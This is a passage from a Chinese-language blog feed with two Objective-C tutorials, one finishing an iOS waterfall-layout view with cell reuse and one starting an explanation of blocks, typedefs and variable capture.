class="keyword">self</span>.dataSource waterFlowView:<span class="keyword">self</span> cellAtIndex:i];</div><div class="line">                cell.frame = cellFrame;</div><div class="line">                [<span class="keyword">self</span> addSubview:cell];</div><div class="line">            &#125;</div><div class="line">            </div><div class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">// 不在屏幕上</span></div><div class="line">            <span class="keyword">if</span> (cell != <span class="literal">nil</span>) &#123;</div><div class="line">                [cell removeFromSuperview];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="4-3-内存浪费-2"><a href="#4-3-内存浪费-2" class="headerlink" title="4.3 内存浪费(2)"></a>4.3 内存浪费(2)</h2><p>上一步骤我们实现了按需求添加cell，但是<code>layoutSubviews</code>会在CFWaterFlowView滚动时候不断的调用<strong>（哪怕只有微小的滚动），</strong>这样会导致<strong>cell被疯狂的重复添加</strong>。</p>
<p>-&gt; 为了解决这一问题，我们需要保证在cell从未添加到CFWaterFlowView时才执行<code>[self addSubview:cell]</code></p>
<p>-&gt; 为此我们需要设立一个属性保存已经添加到CFWaterFlowView的cell，为了避免重复，使用一个Dictionary<code>@property (nonatomic, strong) NSMutableDictionary *displayingCells;</code>来保存，key值为cell的索引(index)</p>
<p>-&gt; 如果在添加前检索到已经有对应索引cell在Dictionary中，就不再重复添加</p>
<p>-&gt; 更改<code>layoutSubviews</code>代码</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)layoutSubviews &#123;</div><div class="line">    </div><div class="line">    <span class="built_in">NSUInteger</span> cellsCount = <span class="keyword">self</span>.cellFrames.count;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cellsCount; i++) &#123;</div><div class="line">        <span class="comment">// 对应的frame</span></div><div class="line">        <span class="built_in">CGRect</span> cellFrame = [<span class="keyword">self</span>.cellFrames[i] <span class="built_in">CGRectValue</span>];</div><div class="line">        <span class="comment">// 如果该frame在屏幕显示范围内，加载cell</span></div><div class="line">        <span class="built_in">CFWaterFlowViewCell</span> *cell = <span class="keyword">self</span>.displayingCells[@(i)];</div><div class="line">        <span class="keyword">if</span> ([<span class="keyword">self</span> isInScreen:cellFrame]) &#123; <span class="comment">// 在屏幕上</span></div><div class="line">            <span class="keyword">if</span> (cell == <span class="literal">nil</span>) &#123;</div><div class="line">                <span class="comment">// 向代理索取一个cell</span></div><div class="line">                cell = [<span class="keyword">self</span>.dataSource waterFlowView:<span class="keyword">self</span> cellAtIndex:i];</div><div class="line">                cell.frame = cellFrame;</div><div class="line">                [<span class="keyword">self</span> addSubview:cell];</div><div class="line">                <span class="keyword">self</span>.displayingCells[@(i)] = cell;</div><div class="line">            &#125;</div><div class="line">            </div><div class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">// 不在屏幕上</span></div><div class="line">            <span class="keyword">if</span> (cell != <span class="literal">nil</span>) &#123;</div><div class="line">                [cell removeFromSuperview];</div><div class="line">                [<span class="keyword">self</span>.displayingCells removeObjectForKey:@(i)];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="4-4-缓存池"><a href="#4-4-缓存池" class="headerlink" title="4.4 缓存池"></a>4.4 缓存池</h2><p>按照一个步骤，能对性能做了一些优化，但仍然再存在问题：<strong>没有类似UITableView的cell缓存池功能，并提供接口让用户能够使用缓存池中的cell</strong></p>
<p>`</p>
<p>对于缓存池，我们很容易想到用一个Set来作为缓存池。<br>建立属性<code>@property (nonatomic, strong) NSMutableSet *reusableCells;</code>作为缓存池</p>
<p>仿照UITableView，定义并实现缓存池方法`- (CFWaterFlowViewCell <em>)dequeueReusableCellWithIdentifier:(NSString </em>)identifier;</p>
<p>在<code>dequeueReusableCellWithIdentifier</code>方法中我们需要：</p>
<ol>
<li>遍历缓存池，检索符合<code>(NSString *)identifier</code>的cell</li>
<li>如果检索到，从缓存池中移除该cell -&gt; 返回该cell</li>
<li>如果没有检索到，返回nil</li>
</ol>
<h2 id="4-5-缓存池代码实现"><a href="#4-5-缓存池代码实现" class="headerlink" title="4.5 缓存池代码实现"></a>4.5 缓存池代码实现</h2><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> *  根据ID查找可循环利用的cell</div><div class="line"> *</div><div class="line"> *  @return 可循环利用的cell</div><div class="line"> */</div><div class="line">- (<span class="built_in">CFWaterFlowViewCell</span> *)dequeueReusableCellWithIdentifier:(<span class="built_in">NSString</span> *)identifier &#123;</div><div class="line">    </div><div class="line">    __block <span class="built_in">CFWaterFlowViewCell</span> *reusableCell = <span class="literal">nil</span>;</div><div class="line">    [<span class="keyword">self</span>.reusableCells enumerateObjectsUsingBlock:^(<span class="built_in">CFWaterFlowViewCell</span> *cell, <span class="built_in">BOOL</span> * stop) &#123;</div><div class="line">        <span class="keyword">if</span> ([cell.identifier isEqualToString:identifier]) &#123;</div><div class="line">            reusableCell = cell;</div><div class="line">            *stop = <span class="literal">YES</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> (reusableCell != <span class="literal">nil</span>) &#123; <span class="comment">// 如果缓存池中有</span></div><div class="line">        <span class="comment">// 从缓存池中移除</span></div><div class="line">        [<span class="keyword">self</span>.reusableCells removeObject:reusableCell];</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> reusableCell;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="5-反馈"><a href="#5-反馈" class="headerlink" title="5 反馈"></a>5 反馈</h1><p>以上已经完成了瀑布流框架的完整实现</p>
<p>如果你需要直接使用该框架，访问GitHub项目地址：<a href="https://github.com/summertian4/iOS-CFWaterFlowView" target="_blank" rel="external">https://github.com/summertian4/iOS-CFWaterFlowView</a></p>
<p>希望你能够喜欢本套框架以及博主这个萌萌哒大四女程序员^_^</p>
<p>如果有什么修改建议，可以发送邮件到coderfish@163.com，也欢迎到我的<a href="http://zhoulingyu.com">博客</a></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x63;&#x6f;&#100;&#x65;&#x72;&#x66;&#105;&#x73;&#104;&#x40;&#49;&#54;&#x33;&#46;&#x63;&#111;&#x6d;">&#x63;&#x6f;&#100;&#x65;&#x72;&#x66;&#105;&#x73;&#104;&#x40;&#49;&#54;&#x33;&#46;&#x63;&#111;&#x6d;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-GitHub&quot;&gt;&lt;a href=&quot;#1-GitHub&quot; class=&quot;headerlink&quot; title=&quot;1 GitHub&quot;&gt;&lt;/a&gt;1 GitHub&lt;/h1&gt;&lt;p&gt;博主已经写好了一份瀑布流的框架，如果你想直接使用，可以点击进入&lt;a href=&quot;https://github.com/summertian4/iOS-CFWaterFlowView&quot;&gt;CFWaterFlowView&lt;/a&gt;的项目主页。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/summertian4/iOS-CFWaterFlowView&quot;&gt;CFWaterFlowView&lt;/a&gt;是博主已经封装好的瀑布流框架，轻量级、简单、易用，希望你喜欢。&lt;/p&gt;
&lt;h1 id=&quot;2-简介&quot;&gt;&lt;a href=&quot;#2-简介&quot; class=&quot;headerlink&quot; title=&quot;2 简介&quot;&gt;&lt;/a&gt;2 简介&lt;/h1&gt;&lt;p&gt;瀑布流是一种非常常用的UI布局，可以为用户带来沉浸式的体验，不需要打断用户的阅读。非常适合带图片信息的展示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xnrog.com1.z0.glb.clouddn.com/github_iOS-CFWaterFlowView-show-02.jpg-w375&quot; alt=&quot;CFWaterFlowView展示&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.hong16.net/wp-content/uploads/2015/03/v3.jpg&quot; alt=&quot;瀑布流样式示例&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>iOS学习——block深入浅出</title>
    <link href="http://zhoulingyu.com/2015/11/20/iOS%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94block%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/"/>
    <id>http://zhoulingyu.com/2015/11/20/iOS学习——block深入浅出/</id>
    <published>2015-11-20T04:00:58.000Z</published>
    <updated>2016-08-05T06:23:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实几乎天天都在用block吧，却没有仔细研究过，这次也当给自己补课啦</p>
<h1 id="block"><a href="#block" class="headerlink" title="block"></a>block</h1><p>这几个基本概念会帮助你理解block</p>
<ol>
<li>block是一种变量类型</li>
<li>block是C级别的语法和运行机制</li>
<li>block除了包含可执行代码以外，还包含了与堆、栈内存绑定的变量。所以Block对象包含着一组状态数据，这些数据在程序执行时用于对行为产生影响</li>
<li>block的意义在于不仅包含了回调期间的代码，又包含了执行期间需要的数据，并且支持多线程</li>
<li>block类似于C语言的函数指针，不要看的太难</li>
</ol>
<h1 id="block的定义和基本结构"><a href="#block的定义和基本结构" class="headerlink" title="block的定义和基本结构"></a>block的定义和基本结构</h1><p>放上@传智如意大师的解说图<br><img src="http://img.my.csdn.net/uploads/201208/07/1344323584_7609.png" alt="block定义"></p>
<p>现在看是不是有点麻烦？直接上例子，小鱼喜欢把详细的解释放在代码里（程序员风格），相信你一定瞬间弄懂</p>
<p>建立了一个command项目，列出了各种block的定义</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[]) &#123;</div><div class="line">    <span class="keyword">@autoreleasepool</span> &#123;</div><div class="line">        </div><div class="line">        <span class="comment">/********* 1.1 无参数无返回值-完整写法 *********/</span></div><div class="line">        <span class="keyword">void</span> (^myBlock1)() = ^()&#123;</div><div class="line">            <span class="built_in">NSLog</span>(<span class="string">@"无参数无返回值的block"</span>);</div><div class="line">        &#125;;</div><div class="line">        myBlock1();</div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        <span class="comment">/********* 1.2 无参数无返回值-简写 *********/</span></div><div class="line">        <span class="keyword">void</span> (^myBlock1_simple)() = ^&#123;</div><div class="line">            <span class="built_in">NSLog</span>(<span class="string">@"无参数无返回值的block的简写"</span>);</div><div class="line">        &#125;;</div><div class="line">        myBlock1_simple();</div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        <span class="comment">/********* 2.1 有参数无返回值 *********/</span></div><div class="line">        <span class="comment">/**</span></div><div class="line">         * void (^block变量名)(参数类型及个数) = ^(形参列表)&#123;代码块&#125;;</div><div class="line">         */</div><div class="line">        <span class="keyword">void</span> (^myBlock2)(<span class="keyword">int</span>, <span class="keyword">int</span>) = ^(<span class="keyword">int</span> x, <span class="keyword">int</span> y)&#123;</div><div class="line">            <span class="built_in">NSLog</span>(<span class="string">@"有参数无返回值，两数和为:%d"</span>, x + y);</div><div class="line">        &#125;;</div><div class="line">        myBlock2(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        <span class="comment">/********* 2.2 对block变量重新赋值 *********/</span></div><div class="line">        myBlock2 = ^(<span class="keyword">int</span> x, <span class="keyword">int</span> y) &#123;</div><div class="line">            <span class="built_in">NSLog</span>(<span class="string">@"对block变量重新赋值，两数差为:%d"</span>, x - y);</div><div class="line">        &#125;;</div><div class="line">        myBlock2(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        <span class="comment">/********* 3 无参数有返回值 *********/</span></div><div class="line">        <span class="built_in">NSString</span> *(^myBlock3)() = ^ ()&#123;</div><div class="line">            <span class="keyword">return</span> <span class="string">@"无参数有返回值"</span>;</div><div class="line">        &#125;;</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"%@"</span>, myBlock3());</div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        <span class="comment">/********* 4 有参数有返回值 *********/</span></div><div class="line">        <span class="keyword">int</span> (^myBlock4)(<span class="keyword">int</span>, <span class="keyword">int</span>) = ^(<span class="keyword">int</span> x, <span class="keyword">int</span> y) &#123;</div><div class="line">            <span class="keyword">return</span> x + y;</div><div class="line">        &#125;;</div><div class="line">        </div><div class="line">        <span class="keyword">int</span> result = myBlock4(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"有参数有返回值，两数和为:%d"</span>, result);</div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="block的类型定义-typedef"><a href="#block的类型定义-typedef" class="headerlink" title="block的类型定义/typedef"></a>block的类型定义/typedef</h1><p>C语言的typedef，大家应该比较常见，没见过也没关系。typedef用来为复杂的声明定义简单的别名，比如对变量、类型等等取别名。</p>
<p>OC是兼容C的，block又是一个block是C级别的语法，所以我们可以为block进行别称定义。</p>
<p>别称定义是为了减少代码量，并使得代码可读性更强。你可以把『对block的typedef』理解成『对象抽象成类』</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[]) &#123;</div><div class="line">    <span class="keyword">@autoreleasepool</span> &#123;</div><div class="line">        </div><div class="line">        <span class="comment">// 定义、赋值</span></div><div class="line">        <span class="keyword">void</span> (^myBlock)() = ^&#123;</div><div class="line">            <span class="built_in">NSLog</span>(<span class="string">@"myBlock"</span>);</div><div class="line">        &#125;;</div><div class="line">        </div><div class="line">        <span class="comment">// 调用</span></div><div class="line">        myBlock();</div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        <span class="comment">// 定义一个代码块类型</span></div><div class="line">        <span class="keyword">typedef</span> <span class="keyword">void</span> (^SimpleBlockType)();</div><div class="line">        </div><div class="line">        <span class="comment">// 创建一个该类型的变量并赋值</span></div><div class="line">        SimpleBlockType simpleBlock;</div><div class="line">        simpleBlock = myBlock;</div><div class="line">        </div><div class="line">        <span class="comment">// 调用</span></div><div class="line">        simpleBlock();</div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        </div><div class="line">        <span class="comment">// 定义一个代码块类型</span></div><div class="line">        <span class="keyword">typedef</span> <span class="keyword">int</span> (^Parameter_Return_BlockType)(<span class="keyword">int</span>, <span class="keyword">int</span>);</div><div class="line">        </div><div class="line">        <span class="comment">// 创建一个该类型的变量并赋值</span></div><div class="line">        Parameter_Return_BlockType p_r_Block;</div><div class="line">        p_r_Block = ^(<span class="keyword">int</span> x, <span class="keyword">int</span> y) &#123;</div><div class="line">            <span class="keyword">return</span> x + y;</div><div class="line">        &#125;;</div><div class="line">        </div><div class="line">        <span class="comment">// 调用</span></div><div class="line">        <span class="keyword">int</span> result = p_r_Block(<span class="number">1</span>, <span class="number">2</span>);</div><div class="line">        <span class="built_in">NSLog</span>(<span class="string">@"x + y = %d"</span>, result);</div><div class="line">        </div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>现在你可以看出将block进行typedef可以把一种block当做类的实例化一样使用，非常方便。</p>
<h1 id="block访问外部变量"><a href="#block访问外部变量" class="headerlink" title="block访问外部变量"></a>block访问外部变量</h1><p>其实对很多来说，一开始使用block最头疼的是弄不清block对外部变量的访问。</p>
<p>你只需要记住两点：</p>
<ol>
<li>block只允许对<code>普通</code>外部变量进行读操作，不允许写操作</li>
<li>block运行对声明为<code>__block类型</code>的变量进行读写操作</li>
</ol>
<h2 id="读操作"><a href="#读操作" class="headerlink" title="读操作"></a>读操作</h2><figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/************** 内存与读访问 **************/</span></div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"========================= 内存与读访问 ========================="</span>);</div><div class="line"><span class="comment">// 外部变量</span></div><div class="line"><span class="keyword">int</span> externalVariable = <span class="number">0</span>;</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"外部访问：externalVariable = %d"</span>, externalVariable);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"外部访问：externalVariable的地址是：%p"</span>, &amp;externalVariable);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"\n"</span>);</div><div class="line"></div><div class="line"><span class="keyword">void</span> (^myBlock)() = ^&#123;</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"内部访问：externalVariable = %d"</span>, externalVariable);</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"内部访问：externalVariable的地址是：%p"</span>, &amp;externalVariable);</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"内部访问：当block访问外部变量时，会将变量的值以const方式copy一份到block的所在内存空间"</span>);</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"内部访问：所以在block中对外部变量操作对外部变量不会产生影响，编译器也不允许在block内对外部变量修改"</span>);</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"\n"</span>);</div><div class="line">&#125;;</div><div class="line">myBlock();</div><div class="line"></div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"回到外部访问：externalVariable的地址是：%p"</span>, &amp;externalVariable);</div></pre></td></tr></table></figure>
<p>以上代码的运行结果：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] ====================== 内存与读访问 ======================</div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 外部访问：externalVariable = <span class="number">0</span></div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 外部访问：externalVariable的地址是：<span class="number">0x7fff5fbff78c</span></div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] </div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 内部访问：externalVariable = <span class="number">0</span></div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 内部访问：externalVariable的地址是：<span class="number">0x100600020</span></div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 内部访问：当block访问外部变量时，会将变量的值以<span class="keyword">const</span>方式<span class="keyword">copy</span>一份到block的所在内存空间</div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 内部访问：所以在block中对外部变量操作对外部变量不会产生影响，编译器也不允许在block内对外部变量修改</div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] </div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 回到外部访问：externalVariable的地址是：<span class="number">0x7fff5fbff78c</span></div></pre></td></tr></table></figure>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol>
<li>你可以看出block可以对<code>外部变量externalVariable</code>读访问</li>
<li>你可以看出block内部访问到的和<code>外部变量externalVariable</code>本身地址不同</li>
<li>你可以推测block内部访问到的其实并不是真正的那个<code>外部变量externalVariable</code></li>
</ol>
<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><ol>
<li>block访问普通外部变量时，会将<strong>变量的值</strong>以<strong>const</strong>方式<strong>copy</strong>一份到<strong>block的所在内存空间</strong></li>
<li>所以block内部访问的并不是真正的外部变量</li>
<li>const是指以常量方式，所以编译器不允许修改copy的变量</li>
</ol>
<h2 id="写操作"><a href="#写操作" class="headerlink" title="写操作"></a>写操作</h2><p>如果真的要对外部变量进行写操作呢？<br>你需要做的是：</p>
<ol>
<li>将你需要要操作的变量定义成__block</li>
</ol>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/************** 写访问 **************/</span></div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"========================= 写访问 =========================="</span>);</div><div class="line"><span class="comment">// 外部变量</span></div><div class="line">__block <span class="keyword">int</span> externalVariable2 = <span class="number">0</span>;</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"外部访问：externalVariable2 = %d"</span>, externalVariable2);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"外部访问：externalVariable2的地址是：%p"</span>, &amp;externalVariable2);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"\n"</span>);</div><div class="line"></div><div class="line"><span class="keyword">void</span> (^myBlock2)() = ^&#123;</div><div class="line">    externalVariable2 = <span class="number">100</span>;</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"内部访问：externalVariable2 = %d"</span>, externalVariable2);</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"内部访问：externalVariable2的地址是：%p"</span>, &amp;externalVariable2);</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"内部访问：仍然会copy一份到block的所在内存空间，但不是以const方式"</span>);</div><div class="line">    <span class="built_in">NSLog</span>(<span class="string">@"\n"</span>);</div><div class="line">&#125;;</div><div class="line">myBlock2();</div><div class="line"></div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"回到外部访问：externalVariable2 = %d"</span>, externalVariable2);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"回到外部访问：externalVariable2的地址是：%p"</span>, &amp;externalVariable2);</div></pre></td></tr></table></figure>
<p>以上代码运行结果：</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] ======================== 写访问 ========================</div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 外部访问：externalVariable2 = <span class="number">0</span></div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 外部访问：externalVariable2的地址是：<span class="number">0x7fff5fbff750</span></div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] </div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 内部访问：externalVariable2 = <span class="number">100</span></div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 内部访问：externalVariable2的地址是：<span class="number">0x100600048</span></div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 内部访问：仍然会<span class="keyword">copy</span>一份到block的所在内存空间，但不是以<span class="keyword">const</span>方式</div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] </div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 回到外部访问：externalVariable2 = <span class="number">100</span></div><div class="line">block_访问外部变量[<span class="number">34781</span>:<span class="number">2197055</span>] 回到外部访问：externalVariable2的地址是：<span class="number">0x100600048</span></div></pre></td></tr></table></figure>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ol>
<li>你可以看出声明为__block类型的变量可以在block内部进行写访问</li>
<li>你可以看出<code>外部变量externalVariable2</code> 在block被访问时和访问前的地址仍然不同</li>
<li>你可以看出<code>外部变量externalVariable2</code> 在block被访问后地址改变了</li>
</ol>
<h3 id="解释-1"><a href="#解释-1" class="headerlink" title="解释"></a>解释</h3><ol>
<li>对于声明为__block类型的变量在block中访问时，仍然会copy一份到block的所在内存空间，但不是以const方式</li>
<li>所以你可以对变量进行写操作</li>
<li>在block中访问__block类型的变量后，该变量的地址将会更改为block中的copy的地址</li>
</ol>
<h1 id="block的回调"><a href="#block的回调" class="headerlink" title="block的回调"></a>block的回调</h1><p>通常我们成为回调，在java中也称为钩子函数，spring称为面向切面编程，是一种基于OOP的优秀编程思想</p>
<p>有的时候，我们会重复的写一段逻辑，它可能是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">事件A</div><div class="line">事件B</div><div class="line">**特殊事件X**</div><div class="line">事件C</div><div class="line">事件D</div><div class="line">事件E</div></pre></td></tr></table></figure>
<p>这一段逻辑的前部分和后部分是固定的，但是中间会发生一段视情况而定的代码。<br>如果这段逻辑要发生5遍，那么就要重复写5次几乎相同的代码。这时候你会想，如果只要写中间那一段就可以大幅度优化代码。<br>block可以帮你实现这一段逻辑</p>
<p>你可以这样写：</p>
